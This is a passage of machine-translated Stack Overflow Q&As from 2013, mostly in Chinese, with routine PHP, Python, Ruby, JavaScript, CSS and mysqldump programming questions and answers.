对于独立的 Jetty，您需要使用[WebAppContext.setInitParameter()](http://download.eclipse.org/jetty/stable-7/apidocs/org/eclipse/jetty/server/handler/ContextHandler.html#setInitParameter%28java.lang.String,%20java.lang.String%29)方法执行类似的操作。

```
ctx.setInitParameter("contextClass", "org.springframework.web.context.support.AnnotationConfigWebApplicationContext");
ctx.setInitParameter("contextConfigLocation", "com.yourbasepackage"); 
```

# php - MySQL数据的不同表格单元格颜色

> ID：15750501
> 
> 赞同：1
> 
> 时间：2013-04-01T19:40:47.277
> 
> 标签：php, css, mysql, html-table

我想为不同的 MySQL 数据更改表格单元格的背景颜色。我的情况是当用户输入他们的体重和身高时，它会计算他们的体重指数（BMI）并输出BMI类别。像这样的东西：

![BMI表](https://i.stack.imgur.com/DrAOO.png)

现在如何更改 BMI 类别的表格单元格颜色，其中“体重过轻”为白色，“正常体重”为黄色，“超重”为橙色？我尝试了以下但不起作用。

这就是我的 PHP 代码中的内容：

```
echo "<table border=\"1\"><tr><th>Name</th> //etc.
if (mysqli_num_rows($result) == 0)
echo "<tr><td colspan='2'>No records found.</td></tr>";

else {
while ($row = mysqli_fetch_assoc($result)) 
 {
 echo "<tr><td>" . $row['Name'] . "</td>"; 
 //some more codes for weight, height, BMI
 echo "<td class='<?php $tdClass; ?>'>" . $row['Health_Measure'] . "</td>";
 }
}
echo "</table>";

if ($row['Health_Measure'] == "Underweight") 
        $tdClass = 'underweight';

else if ($row['Health_Measure'] == "Normal Weight") 
    $tdClass = 'normalweight';

else if ($row['Health_Measure'] == "Overweight") 
    $tdClass = 'overweight'; 
```

CSS：

```
.underweight {
    background-color:white;
}
.normalweight {
    background-color:yellow;
}
.overweight {
    background-color:orange;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:49:10.870

Your code to assign the $tdClass variable is after the loop that uses the $tdClass variable, so the td tags won't have the right classes. Change it to this...

```
 echo "<table border=\"1\"><tr><th>Name</th> //etc.
if (mysqli_num_rows($result) == 0)
echo "<tr><td colspan='2'>No records found.</td></tr>";

else {
while ($row = mysqli_fetch_assoc($result)) 
 {
    if ($row['Health_Measure'] == "Underweight") 
        $tdClass = 'underweight';

else if ($row['Health_Measure'] == "Normal Weight") 
    $tdClass = 'normalweight';

else if ($row['Health_Measure'] == "Overweight") 
    $tdClass = 'overweight';

 echo "<tr><td>" . $row['Name'] . "</td>"; 
 //some more codes for weight, height, BMI
 echo "<td class='<?php $tdClass; ?>'>" . $row['Health_Measure'] . "</td></tr>";
 }
}
echo "</table>"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:43:24.863

您只需要移动代码来确定循环内输出表格行的 TD 的 CSS 类。

# asp.net - 在 listview/repeater itemtemplate 中多次显示缩略图

> ID：15750508
> 
> 赞同：0
> 
> 时间：2013-04-01T19:41:03.837
> 
> 标签：asp.net, listview, repeater

如果我想使用列表视图/（或转发器）在页面上显示最多 50 条记录，并且列表视图或转发器中的 ItemTemplate 包含用户的缩略图，有没有最好的方法来做到这一点？我只是在考虑页面加载时间和加载每张图片所需的时间......

图像是否可以加载一次，每次出现的时候都是页面上已经存在的图像的副本？

这是可能的还是有最好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:07:36.970

我最近做了类似的事情，图像大约 30k 和 200x80，对我来说效果很好。图像将在第一次加载后被缓存，所以我可能不会担心。

# highcharts - Highcharts 散点图，大量数据点运行速度非常慢

> ID：15750515
> 
> 赞同：5
> 
> 时间：2013-04-01T19:41:28.580
> 
> 标签：highcharts

我在这里看到了一些建议，但似乎没有什么适用于我的情况。我还看到了一些未解决的类似问题。我有很多数据（大约 40k）点的散点图。它真的很慢。下面的链接（遗传数据 - 称为曼哈顿图）最终会加载，但速度很慢。我需要找到一种优化性能的方法。

[http://ricediversity.org/test/highcharts/examples/line-ajax/index-b.htm](http://ricediversity.org/test/highcharts/examples/line-ajax/index-b.htm)

此外，我正在尝试从我的数据文件向我的工具提示添加其他信息（数据字段），但我也无法使其正常工作。有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T09:12:50.760

您可以尝试禁用动画/阴影。

[http://api.highcharts.com/highcharts#chart.animation](http://api.highcharts.com/highcharts#chart.animation) [http://api.highcharts.com/highcharts#plotOptions.series.animation](http://api.highcharts.com/highcharts#plotOptions.series.animation) [http://api.highcharts.com/highcharts#tooltip.animation](http://api.highcharts.com/highcharts#tooltip.animation) [http://api.highcharts.com/highcharts#tooltip.animation /api.highcharts.com/highcharts#plotOptions.series.shadow](http://api.highcharts.com/highcharts#plotOptions.series.shadow)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-25T02:49:23.967

至于工具提示，请查看[highcharts data api](http://api.highcharts.com/highcharts#series.data)，特别是列表中的第 2 位。如果这不适合您，您可以传入一个对象数组，在其中指定要获取的数据。然后，在格式化程序中，很容易引用。[这是一个 JSfiddle](http://jsfiddle.net/Yrygy/38/)，展示了如何在名称位于您的数据数组中时引用它们。

格式化程序是

```
formatter: function () {
    var s = "";
    $.each(this.points, function (i, point) {
        s += point.point.nameList[0];
    });
    return s;
} 
```

数据集如下所示：

```
data = [ ..., 
         {x: xval, y: yval, nameList: myListOfNames},
         ...] 
```

其中`xval`和`yval`是数据点的 x 和 y 值，并且`myListOfNames`是字符串数组。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T08:05:41.587

这里有一些关于在 highcharts 网站上优化性能的提示：http: [//docs.highcharts.com/#faq](http://docs.highcharts.com/#faq) $optimize-performance

但是，有了这么多点，我会考虑使用 highstock。没有办法弄清楚这么多点的细节，所以以某种方式聚合它们会制作出更好的图表（[http://docs.highcharts.com/#data-grouping](http://docs.highcharts.com/#data-grouping)）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-01-12T19:31:44.400

也许为时已晚，无法使用（示例链接不再有效，所以我不确定这是否适用），但是有一个新的 Highcharts 插件可以对时间序列数据进行下采样，以保留原始数据的形状。

[http://www.highcharts.com/plugin-registry/single/13/Highcharts-Downsample](http://www.highcharts.com/plugin-registry/single/13/Highcharts-Downsample)

# ruby-on-rails - Ruby 解析 CSV 文件以打印出行

> ID：15750517
> 
> 赞同：0
> 
> 时间：2013-04-01T19:41:34.320
> 
> 标签：ruby-on-rails, ruby, csv

我在我的 Rails 应用程序中有一个文件上传，我想解析 CSV 文件，假设上传正常。您可以看到下面的评论，指出我想在哪里读取 CSV 文件的行。我怎样才能做到这一点？我使用carrierwave进行文件上传。

我是这样安装的

```
mount_uploader :file, LCFileUploader 
```

这是我目前拥有的代码

```
require 'CSV'
class LCFilesController < ApplicationController
    def new
        authorize! :create, :lc_file
        @lc_file = LCFile.new
    end

    def create
        authorize! :create, :lc_file
        puts params
        @lc_file = LCFile.new(params[:lc_file])
        @lc_file.user_id = current_user.id
        if @lc_file.save

            #PARSE CSV HERE TO PRINT OUT THE ROWS OF THE CSV FILE
            CSV.foreach(@lc_file.file.path) do |row|
                puts row
            end

            redirect_to lc_path, :notice => 'New lc created!'
        else
            render :new
        end
    end
end 
```

我得到这个错误：

```
undefined method `find_all_by_team_id' for #<Class:0x007fe14c40d848> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:55:03.800

您可以使用[CSV 类](http://ruby-doc.org/stdlib-1.9.2/libdoc/csv/rdoc/CSV.html)：

```
puts CSV.read(@lc_file.file.path) 
```

或一次一行：

```
CSV.foreach(@lc_file.file.path) do |row|
  puts row
end 
```

除了 CSV 生成之外，还有一些问题：

*   发送发送一些输出后，重定向将不起作用。但即使这样做了，也不会看到输出，因为您正在重定向。
*   您重定向到的路径不正确（我相信这就是您收到该错误的原因）。我想你想要类似的东西`lcfiles_path`or `lcfile_path(@lc_file)`。运行`rake routes`（与运行 rails 控制台的方式相同）以查看所有可用路由的列表。

现在，如果您仍然有问题，我建议发布另一个问题，因为这个问题主要是关于 CSV 生成，应该使用我在此答案开头发布的代码来解决。

# php - 不向数据库提交数据

> ID：15750518
> 
> 赞同：0
> 
> 时间：2013-04-01T19:41:39.867
> 
> 标签：php, mysql

应该是一个简单的代码对我来说不起作用。它正在显示 HTML Woo! 消息，但它实际上并没有提交数据。

```
$forgetKeyEmail = mysql_real_escape_string($_GET['key']);
$resetUsername = mysql_real_escape_string($_POST['inputUser']);
if ($_GET['do'] == "update") 
{
    $hasher = new PasswordHash(10, false);
    $resetPassword = $hasher->HashPassword(mysql_real_escape_string($_POST['inputPassword']));
    if ($_POST['inputPassword'] !== "")
    {
        mysql_query("UPDATE users SET password = '$resetPassword' WHERE forgetKey = '$forgetKeyEmail'");
        ?>
            <div class="alert alert-success" style="margin:0;">
            <strong>Woooo!</strong> Your password has been changed, you can now <a href="login.php">login.</a>
            </div>
            <?php
    }
    else 
    {
             ?>
            <div class="alert alert-error" style="margin:0;">
            <strong>Woops!</strong> You need to fill out a password!
            </div>
            <?php
    }
} 
```

以下是供参考的 HTML 表单：

```
<form method="POST" class="form-horizontal" action="?do=update" >
  <div class="control-group">
    <label class="control-label" for="inputPassword">New Password</label>
    <div class="controls">
      <input type="text" id="inputPassword" name="inputPassword" placeholder="Password">
    </div>
  </div>
  <div class="control-group">
    <div class="controls">
      <button type="submit" class="btn btn-primary">Reset!</button>
    </div>
  </div>
</form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:55:11.550

很可能，它就像区分大小写或拼写错误的表单名称一样愚蠢。仔细检查表和字段名称、查询字符串值等的大小写。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T20:33:32.757

以下行有一个小错误：

```
<form method="POST" class="form-horizontal" action="?do=update" > 
```

每当提交表单时，url 都是 `..?do=update`.

因为，我们正在收集（抓取）**键值**作为**GET**变量：

```
$forgetKeyEmail = mysql_real_escape_string($_GET['key']); 
```

因此，`$forgetKeyEmail`是一个空字符串，因为 url 中没有**键**，即`$_GET['key']`未设置。

因此将上面的 html 代码更改为：

```
<form method="POST" class="form-horizontal" action=?do=update&key=<?php echo $forgetKeyEmail; ?> 
```

它会像魅力一样工作。

# python - 类属性和 __setattr__

> ID：15750522
> 
> 赞同：22
> 
> 时间：2013-04-01T19:42:10.520
> 
> 标签：python

在 Python 类中，当我使用`__setattr__`它时，它优先于此类（或任何基类）中定义的属性。考虑以下代码：

```
class Test(object):
    def get_x(self):
        x = self._x
        print "getting x: %s" % x
        return x
    def set_x(self, val):
        print "setting x: %s" % val
        self._x = val
    x = property(get_x, set_x)
    def __getattr__(self, a):
        print "getting attr %s" % a
        return -1
    def __setattr__(self, a, v):
        print "setting attr %s" % a 
```

当我创建类并尝试设置`x`时，`__setattr__`调用而不是`set_x`：

```
>>> test = Test()
>>> test.x = 2
setting attr x
>>> print test.x
getting attr x_
getting x: -1
-1 
```

我想要实现的是，`__setattr__`只有在没有相关属性（即`test.x = 2`应该调用）时才调用实际代码`set_x`。我知道我可以通过手动检查 if `a`is " *x* " is来轻松实现这一点`__setattr__`，但这会使设计变得糟糕。有没有更聪明的方法来确保`__setattr__`类和所有基类中定义的每个属性的正确行为？

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2013-04-01T20:21:46.947

Python 用于属性的搜索顺序如下所示：

1.  `__getattribute__`和`__setattr__`
2.  数据描述符，如`property`
3.  来自对象的实例变量`__dict__`（设置属性时，搜索到此结束）
4.  非数据描述符（如方法）和其他类变量
5.  `__getattr__`

因为`__setattr__`它是排在第一位的，如果你有一个，你需要让它变得聪明，除非希望它处理你班级的所有属性设置。它可以通过以下两种方式中的任何一种变得智能：使其仅处理特定的集合属性，或使其处理*除*某些属性集之外的所有属性。对于您不希望它处理的那些，请致电`super().__setattr__`.

对于您的示例类，处理“除'x'之外的所有属性”可能是最简单的：

```
def __setattr__(self, name, value):
    if name == "x":
        super(Test, self).__setattr__(name, value)
    else:
        print "setting attr %s" % name 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-04-01T20:20:26.837

这不是一个防弹解决方案，但是，就像您建议的那样，您可以`setattr`通过尝试`property`从类的属性（`getattr`在类对象上使用）访问对象来检查是否正在编辑属性。

```
class Test(object):

    def get_x(self):
        x = self._x
        print "getting x: %s" % x
        return x
    def set_x(self, val):
        print "setting x: %s" % val
        self._x = val
    x = property(get_x, set_x)

    @property  # no fset
    def y(self):
        print "getting y: 99"
        return 99

    def __getattr__(self, a):
        print "getting attr %s" % a
        return -1
    def __setattr__(self, a, v):
        propobj = getattr(self.__class__, a, None)
        if isinstance(propobj, property):
            print "setting attr %s using property's fset" % a
            if propobj.fset is None:
                raise AttributeError("can't set attribute")
            propobj.fset(self, v)
        else:
            print "setting attr %s" % a
            super(Test, self).__setattr__(a, v)

test = Test()
test.x = 2
print test.x
#test.y = 88  # raises AttributeError: can't set attribute
print test.y
test.z = 3
print test.z 
```

编辑：替换`self.__dict__[a] = v`为`super(Test, self).__setattr__(a, v)`，如@Blckknght 的回答所示

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-01T19:54:28.970

AFAIK，没有干净的方法可以做到这一点。这里的问题来自 和之间的[不对称](http://docs.python.org/2/reference/datamodel.html#customizing-attribute-access)。前者仅在通过正常方式的属性失败时才调用，而后者则无条件调用。由于没有通用的方法会失败，我不知道是否有办法可以改变这种行为。 `__getattr__``__setattr__``__setattr__`

最终，我相信获得你想要的行为的唯一方法是将你的属性的 set_ 操作折叠到你的`__setattr__`函数中——如果你这样做，你不妨折叠 getter 的行为`__getattr__`来拥有它都可以从 1 个地方维护。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-03-22T22:56:21.470

我多次遇到这个问题，我的首选解决方案如下：

*   对于每个属性，像你一样`[property]`定义`get_[property]`和函数，但不使用装饰器`set_[property]`
*   修改`__getattr__`，`__setattr__`以便他们检查这些功能是否存在，并在可用时使用它们。

这是一个最小的例子：

```
class SmartSetter(object):

  def __init__(self,name):
    self.set_name(name)

  def get_name(self):
    #return the name property
    return self._name

  def set_name(self,value):
    #set the name property
    self._name = value

  def __getattr__(self,key):
    #first condition is to avoid recursive calling of this function by
    #__setattr__ when setting a previously undefined class attribute.
    if not key.startswith('get_') and hasattr(self,'get_'+key):
      return getattr(self,'get_'+key)()
    #implement your __getattr__ magic here...
    raise AttributeError("no such attribute: %s" % key)

  def __setattr__(self,key,value):
    try:
      return getattr(self,'set_'+key)(value)
    except AttributeError:
      #implement your __setattr__ magic here...
      return super(SmartSetter,self).__setattr__(key,value)

if __name__ == '__main__':
  smart_setter = SmartSetter("Bob the Builder")

  print smart_setter.name
  #Will print "Bob the Builder"

  smart_setter.name = "Spongebob Squarepants"

  print smart_setter.name
  #Will print "Spongebob Squarepants" 
```

这种方法的优点是它保留了所有属性的正常行为，除了那些具有“getter”和“setter”方法的属性，并且在添加或删除属性时不需要对`__getattr__`and函数进行任何修改。`__setattr__`

# jquery - 除非调整屏幕大小，否则 jQuery 滑块不会出现

> ID：15750529
> 
> 赞同：0
> 
> 时间：2013-04-01T19:42:41.990
> 
> 标签：jquery, css

我在一个隐藏的 DIV 中使用了一个名为 BXSLIDER 的 Jquery Slider，该 DIV 通过 jQuery 滑动打开。问题是滑块不会出现，除非我稍微调整浏览器的大小。

我认为这是因为滑块 javascript 在 div 打开之前加载，所以直到我调整浏览器大小后才找到正确的高度/宽度尺寸。

有什么解决方法吗？

示例位于：

**[示例](http://newsite.penroserealty.com/areas)确保单击 Cambridge，然后单击 Shopping - Then Resize**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T21:35:50.963

使用可见性隐藏div：隐藏或将其绝对定位在可视区域之外。然后元素仍然被渲染并且滑块可以正确初始化。我还推荐 Jquery 插件 imagesLoaded ( [https://github.com/desandro/imagesloaded](https://github.com/desandro/imagesloaded) )，它对于在任何滑块初始化之前检查所有图像是否已完全加载非常有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-19T14:35:01.787

我知道这是旧的，但它可能会在未来帮助其他人。我有一个类似的问题，在我调整窗口大小之前没有显示 JS 图表。我所做的是将初始化程序包装为一个函数，然后在事件处理程序中调用该函数（在我的情况下，它是单击按钮）。在没有细节的情况下解释很奇怪，但是这里有一个它不起作用的[小提琴，这个](http://jsfiddle.net/Perry_/N3fpz/)[小提琴](http://jsfiddle.net/Perry_/sW7Np/2/)有修复。

```
$("#button").click(function(){
    $("#chartdiv").toggle();
    makeChart();
});

function makeChart() {
     var chart = AmCharts.makeChart("chartdiv", {
         //all the stuff
     });
} 
```

# three.js - 有没有插件可以为three.js自学项目添加轮换？

> ID：15750532
> 
> 赞同：0
> 
> 时间：2013-04-01T19:42:52.300
> 
> 标签：three.js, trackball

我开始使用three.js，想知道是否有一个简单的插件可以添加轨迹球功能，这样我就可以看到我在代码中所做的更改是如何影响简单对象的“底面”的。

我试图遵循：

[http://mrdoob.github.com/three.js/examples/misc_controls_trackball.html](http://mrdoob.github.com/three.js/examples/misc_controls_trackball.html)

但是我收到了很多 EventDispatcher 错误。

通过尝试，我的意思是我已经：

*   添加了“TrackballControls.js”
*   添加了“Detector.js”
*   添加了这段代码：

    ```
    if ( ! Detector.webgl ) Detector.addGetWebGLMessage();
    var controls = new THREE.TrackballControls( camera );
    controls.rotateSpeed = 1.0;
    controls.zoomSpeed = 1.2;
    controls.panSpeed = 0.8;
    controls.noZoom = false;
    controls.noPan = false;
    controls.staticMoving = true;
    controls.dynamicDampingFactor = 0.3;
    controls.keys = [ 65, 83, 68 ];
    controls.addEventListener( 'change', render ); 
    ```

我确实注意到示例中使用的 three.js 与 at 中的不同（但不确定是否重要）：

[http://cdnjs.cloudflare.com/ajax/libs/three.js/r53/three.min.js](http://cdnjs.cloudflare.com/ajax/libs/three.js/r53/three.min.js)

任何建议都会非常有帮助，因为我刚刚开始。

感谢您的时间！

更新：我尝试从这里使用最新版本的 Three.js：

[https://github.com/mrdoob/three.js/blob/master/build/three.js](https://github.com/mrdoob/three.js/blob/master/build/three.js)

我找不到 TrackballControls.js 和 Detector.js 的官方版本，所以我使用了这些版本：

[http://threejsdoc.appspot.com/doc/three.js/src.source/extras/controls/TrackballControls.js.html](http://threejsdoc.appspot.com/doc/three.js/src.source/extras/controls/TrackballControls.js.html)

[http://mrdoob.github.com/three.js/examples/js/Detector.js](http://mrdoob.github.com/three.js/examples/js/Detector.js)

这是我无法开始工作的代码（它是[http://www.aerotwist.com/tutorials/getting-started-with-three-js/](http://www.aerotwist.com/tutorials/getting-started-with-three-js/)和[http://mrdoob.github.com/three 的组合。 js/examples/misc_controls_trackball.html](http://mrdoob.github.com/three.js/examples/misc_controls_trackball.html)并尝试将对象制作成环/圆环）：

```
<!doctype html>
<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en"> <![endif]-->
<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en"> <![endif]-->
<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>Getting Started with Three.js | Aerotwist</title>
  <meta name="description" content="The home of Creative Coder and developer Paul Lewis. Tutorial, experiments and considered opinions found here.">
  <meta name="author" content="Paul Lewis">

  <script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
    <script src="Three.js"></script>
    <script src="TrackballControls.js"></script>
    <script src="Detector.js"></script>
</head>
<style>
  #container {
    background: #000;
    width: 400px;
    height: 300px;
  }
</style>
<body>
<div id="container"></div>
</body>
<script type="text/javascript">
  function animate() {
    requestAnimationFrame( animate );
    controls.update();
  }
  function render() {
    renderer.render( scene, camera );
  }
  var WIDTH = 400,
      HEIGHT = 300;
  // set some camera attributes
  var VIEW_ANGLE = 45,
      ASPECT = WIDTH / HEIGHT,
      NEAR = 0.1,
      FAR = 10000;
  // get the DOM element to attach to
  // - assume we've got jQuery to hand
  var $container = $('#container');
  // create a WebGL renderer, camera
  // and a scene
  var renderer = new THREE.WebGLRenderer();
  var camera =
    new THREE.PerspectiveCamera(
      VIEW_ANGLE,
      ASPECT,
      NEAR,
      FAR);
  var scene = new THREE.Scene();

  // TrackBall code from http://mrdoob.github.com/three.js/examples/misc_controls_trackball.html
  var controls = new THREE.TrackballControls( camera );
  controls.rotateSpeed = 1.0;
  controls.zoomSpeed = 1.2;
  controls.panSpeed = 0.8;
  controls.noZoom = false;
  controls.noPan = false;
  controls.staticMoving = true;
  controls.dynamicDampingFactor = 0.3;
  controls.keys = [ 65, 83, 68 ];
  //controls.addEventListener( 'change', render ); // this was how it used to be at: http://mrdoob.github.com/three.js/examples/misc_controls_trackball.html
  controls.domElement.addEventListener( 'change', render ); // I changed this to fix error message: "controls.addEventListener is not a function"
  // --------------------------
  // add the camera to the scene
  scene.add(camera);
  // the camera starts at 0,0,0
  // so pull it back
  camera.position.z = 300;
  // start the renderer
  renderer.setSize(WIDTH, HEIGHT);
  // attach the render-supplied DOM element
  $container.append(renderer.domElement);
  // ------------------------
  // create the sphere's material
  var sphereMaterial =
    new THREE.MeshLambertMaterial(
      {
        color: 0xCC0000
      });
  // -------------------------------
  // ################ try torus
  var centerpiece = new THREE.TorusGeometry();
  var sphere = new THREE.Mesh(
    centerpiece,
    sphereMaterial);
  // add the sphere to the scene
  scene.add(sphere);
  // ---------------------------
  // create a point light
  var pointLight =
    new THREE.PointLight(0xFFFFFF);
  // set its position
  pointLight.position.x = 10;
  pointLight.position.y = 50;
  pointLight.position.z = 130;
  // add to the scene
  scene.add(pointLight);
  // -------------------------
  // draw!
  renderer.render(scene, camera); 
</script> 
```

每当我单击页面上的任何位置时，都会收到此错误消息：

```
_eye.copy(...).subSelf is not a function 
```

有任何想法吗？

感谢您的时间！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T21:34:00.160

确保您使用的是同一版本的所有文件。最好是最新的。

# css - 带有下划线和箭头背景图像的 CSS h2 元素

> ID：15750533
> 
> 赞同：0
> 
> 时间：2013-04-01T19:42:54.657
> 
> 标签：css, background-image

我有一个 H2 元素，我希望它带有下划线，并且在底部边界线“下方”有一个箭头图形。

目前，箭头出现在上方，如果我更改背景坐标以降低箭头，它开始消失。

我的代码：

```
h2 {
    background: url("images/arrow-title.png") no-repeat scroll 10px 27px transparent;
    line-height: 17px;
    padding-bottom: 15px;
    text-transform: uppercase;
    border-bottom: 2px solid #00a7a8;
} 
```

它目前正在做的事情的图片：

![在此处输入图像描述](https://i.stack.imgur.com/TNkf1.jpg)

我想做的图片：

![在此处输入图像描述](https://i.stack.imgur.com/SH8lA.jpg)

最后，一个指向正确执行此操作的主题的网站链接。我在 Firefox 上查看了“检查元素”，但似乎无法调整 CSS 以使其正常工作。:(

网站链接到看起来正确的主题：http: [//www.joomlart.com/demo/#ja_travel](http://www.joomlart.com/demo/#ja_travel)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:47:19.683

在 H2 中添加一个跨度。将边框应用于该跨度并使用 H2 上的 padding-bottom 来调整箭头位置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:47:41.787

他们正在做的是将 a`<span />`放在`<h2 />`标签内，并给跨度边界底部而不是`<h2 />`

这种方式将`<h2 />`箭头作为背景图像，并且由于`<span />`在底部添加了 3px 填充，因此可以完美对齐。

```
<h2>
  <span>
    This is my header
  </span>
</h2> 
```

然后像这样

```
h2{
  background: url("../images/arrow-title.png") no-repeat left center;
}
span{
  border-bottom: 2px solid black;
  padding-bottom: 3px;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T19:57:35.497

如果您不想使用背景图片，可以尝试使用**伪元素**：

```
h2 {
line-height: 17px;
padding-bottom: 15px;
text-transform: uppercase;
border-bottom: 2px solid #00a7a8;
position: relative;
}
h2:before {
    content: '\25bc';
    position: absolute;
    top: 100%;
    left: 5em;
    color: #00a7a8;
} 
```

请参阅小提琴参考：http: [//jsfiddle.net/audetwebdesign/kFSvL/](http://jsfiddle.net/audetwebdesign/kFSvL/)

主要优点是标记的简单性：

```
<h2>The Header Is Here</h2> 
```

不需要额外的标签！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-01T19:44:51.457

使背景图像的下划线部分。它显然应该从视觉角度来看，所以它也可能是从技术角度来看。

# mysql - 使用 mysqldump 格式化每行插入一个？

> ID：15750535
> 
> 赞同：61
> 
> 时间：2013-04-01T19:43:09.160
> 
> 标签：mysql, mysqldump, mysql-workbench, mysqladministrator

这已被问过几次，但我找不到解决问题的方法。基本上，当使用 MySQL Workbench 管理工具的内置工具 mysqldump 时，当我使用扩展插入转储数据库时，我会得到大量长行数据。我理解它为什么这样做，因为它通过将数据作为一个命令插入（尤其是在 InnoDB 上）来加快插入速度，但是格式化使得实际上很难查看转储文件中的数据，或者使用差异工具比较两个文件如果您将它们存储在版本控制等中。在我的情况下，我将它们存储在版本控制中，因为我们使用转储文件来跟踪我们的集成测试数据库。

现在我知道我可以关闭扩展插入，所以我会得到每行一个插入，这是可行的，但是任何时候你使用转储文件进行恢复都会变慢。

我的核心问题是，在我转储文件时我们使用的旧工具（MySQL 管理员）中，它基本上做同样的事情，但它格式化 INSERT 语句以每行插入一个，同时仍然进行批量插入。所以代替这个：

```
INSERT INTO `coupon_gv_customer` (`customer_id`,`amount`) VALUES (887,'0.0000'),191607,'1.0300'); 
```

你得到这个：

```
INSERT INTO `coupon_gv_customer` (`customer_id`,`amount`) VALUES 
 (887,'0.0000'),
 (191607,'1.0300'); 
```

无论我尝试什么选项，似乎都没有任何方法能够得到这样的转储，这确实是两全其美。是的，它需要更多的空间，但在需要人工阅读文件的情况下，它会更有用。

我是否遗漏了一些东西，并且有一种方法可以使用 MySQLDump 做到这一点，或者我们都倒退了，旧的（现已弃用）MySQL Administrator 工具中的这个功能不再可用？

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2013-08-02T07:06:16.493

尝试使用以下选项： **--skip-extended-insert**

它对我有用。

* * *

## 回答 #2

> 赞同：38
> 
> 时间：2013-11-13T18:23:51.983

使用默认的 mysqldump 格式，转储的每条记录都会在转储文件（即 sql 文件）中生成一个单独的 INSERT 命令，每个命令都在自己的行中。这非常适合源代码控制（例如，svn、git 等），因为它使 diff 和 delta 分辨率更精细，并最终导致更有效的源代码控制过程。但是，对于非常大的表，执行所有这些 INSERT 查询可能会使从 sql 文件恢复的速度非常慢。

使用 --extended-insert 选项通过将所有记录包装到转储 sql 文件的单行上的单个 INSERT 命令中来修复多个 INSERT 问题。但是，源代码控制过程变得非常低效。整个表的内容在 sql 文件中的单行中表示，如果该表中的任何一个字符发生了变化，源代码控制会将整行（即整个表）标记为版本之间的差异。而且，对于大型表，这抵消了使用正式源代码控制系统的许多好处。

所以理想情况下，为了高效的数据库恢复，在 sql 文件中，我们希望每个表都由单个 INSERT 表示。对于有效的源代码控制过程，在 sql 文件中，我们希望该 INSERT 命令中的每条记录位于其自己的行上。

我对此的解决方案是以下备份脚本：

```
#!/bin/bash

cd my_git_directory/

ARGS="--host=myhostname --user=myusername --password=mypassword --opt --skip-dump-date"
/usr/bin/mysqldump $ARGS --database mydatabase | sed 's$VALUES ($VALUES\n($g' | sed 's$),($),\n($g' > mydatabase.sql

git fetch origin master
git merge origin/master
git add mydatabase.sql
git commit -m "Daily backup."
git push origin master 
```

结果是一个 sql 文件 INSERT 命令格式，如下所示：

```
INSERT INTO `mytable` VALUES
(r1c1value, r1c2value, r1c3value),
(r2c1value, r2c2value, r2c3value),
(r3c1value, r3c2value, r3c3value); 
```

一些注意事项：

*   命令行上的密码...我知道，不安全，不同的讨论。
*   --opt：除其他外，打开 --extended-insert 选项（即，每个表一个 INSERT）。
*   --skip-dump-date：mysqldump 通常在创建时将日期/时间戳记在 sql 文件中。当版本之间的唯一差异是该日期/时间戳时，这在源代码控制中可能会变得很烦人。操作系统和源代码控制系统将为文件和版本添加日期/时间戳。它在 sql 文件中并不真正需要。
*   git 命令不是基本问题（格式化 sql 文件）的核心，但显示了我如何将我的 sql 文件恢复到源代码控制中，类似的事情可以用 svn 完成。当将此 sql 文件格式与您选择的源代码控制相结合时，您会发现当您的用户更新他们的工作副本时，他们只需在 Internet 上移动增量（即更改的记录），他们可以利用 diff 实用程序轻松查看数据库中的哪些记录已更改。
*   如果您要转储驻留在远程服务器上的数据库，如果可能，请在该服务器上运行此脚本以避免每次转储时通过网络推送数据库的全部内容。
*   如果可能，在您运行此脚本的同一台服务器上为您的 sql 文件建立一个工作源代码控制存储库；从那里将它们签入存储库。这也将有助于避免每次转储时都必须通过网络推送整个数据库。

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2014-11-07T19:50:27.227

正如其他人所说，使用 sed 替换 "),(" 是不安全的，因为这可能会显示为数据库中的内容。但是有一种方法可以做到这一点：如果您的数据库名称是 my_database，则运行以下命令：

```
$ mysqldump -u my_db_user -p -h 127.0.0.1 --skip-extended-insert my_database > my_database.sql
$ sed ':a;N;$!ba;s/)\;\nINSERT INTO `[A-Za-z0-9$_]*` VALUES /),\n/g' my_database.sql > my_database2.sql 
```

您还可以使用“sed -i”来替换内联。

这是这段代码的作用：

1.  --skip-extended-insert 将为您拥有的每一行创建一个 INSERT INTO。
2.  现在我们使用 sed 来清理数据。请注意，使用 sed 进行常规搜索/替换适用于单行，因此我们无法检测到“\n”字符，因为 sed 一次只工作一行。这就是为什么我们放 ":a;N;$!ba;" 这基本上告诉 sed 搜索多行并缓冲下一行。

希望这可以帮助

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2013-04-02T05:18:04.030

使用这样的选项将转储存储到带有 mysqldump 的 CSV 文件中`--tab`怎么样？

```
